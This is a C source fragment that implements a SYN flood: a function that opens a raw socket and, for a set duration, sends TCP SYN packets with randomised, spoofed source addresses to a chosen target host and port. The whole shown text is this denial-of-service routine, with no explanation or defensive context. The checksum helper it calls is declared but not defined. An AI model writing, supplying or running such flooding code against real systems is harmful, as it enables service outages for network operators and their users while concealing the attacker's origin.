#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>

struct pseudo_header {
    unsigned int src;
    unsigned int dst;
    unsigned char reserve;
    unsigned char protocol;
    unsigned short tcp_length;
};

unsigned short checksum(unsigned short *ptr, int nbytes);

void syn_flood(const char *target, int port, int duration) {

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("socket");
        return;
    }

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    dest.sin_addr.s_addr = inet_addr(target);

    char packet[4096];

    struct iphdr *ip  = (struct iphdr *) packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));

    time_t start = time(NULL);

    while(time(NULL) - start < duration) {

        memset(packet, 0, 4096);

        // TCP Header
        tcp->source = htons(rand() % 65535);
        tcp->dest = htons(port);
        tcp->seq = htonl(rand());
        tcp->ack_seq = 0;
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->window = htons(64240);

        tcp->check = 0;

        // IP Header
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->id = htons(rand());
        ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        ip->ttl = 64;
        ip->protocol = IPPROTO_TCP;
        ip->saddr = rand();                       // IP Spoof
        ip->daddr = inet_addr(target);

        ip->check = 0;
        ip->check = checksum((unsigned short*) packet, sizeof(struct iphdr));

        // Pseudo Header for checksum
        struct pseudo_header psh;
        psh.src = ip->saddr;
        psh.dst = ip->daddr;
        psh.reserve = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));

        char pseudo_buf[4096];
        memcpy(pseudo_buf, &psh, sizeof(struct pseudo_header));
        memcpy(pseudo_buf + sizeof(struct pseudo_header), tcp, sizeof(struct tcphdr));

        tcp->check = checksum((unsigned short*) pseudo_buf,
                              sizeof(struct pseudo_header) + sizeof(struct tcphdr));

        sendto(sock, packet, ntohs(ip->tot_len), 0,
               (struct sockaddr *)&dest, sizeof(dest));
    }

    close(sock);
}
